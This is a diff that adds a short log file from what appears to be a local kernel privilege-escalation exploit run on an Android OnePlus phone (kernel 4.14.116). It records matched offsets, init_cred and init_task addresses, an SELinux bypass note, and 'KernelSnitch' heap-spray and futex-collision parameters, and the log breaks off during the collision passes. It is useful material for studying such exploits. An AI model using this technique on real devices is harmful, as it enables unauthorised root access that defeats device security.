@@ -1,0 +1,17 @@
+[33m[*] [0mkernel: 4.14.116
+[32m[+] [0moffsets matched: 4.14.116
+[33m[*] [0minit_cred image=ffffff800af640b0 alias=ffffffc002f640b0
+[32m[+] [0mstartup context pid=6953 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=6953 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=6953 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=6953 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffffc02a4021a0 bootid_data=ffffffc02a6aa868 init_task=ffffffc02a40cf00 root_tg=ffffffc02a63d580 sysctl_bootid=ffffffc02a6aa868
+[33m[*] [0mp0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mselinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x7ffffffff
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b113380c8
+[33m[*] [0mpass A: 65536 candidates, bucket piled
+[33m[*] [0mpass B: re-measuring unpiled
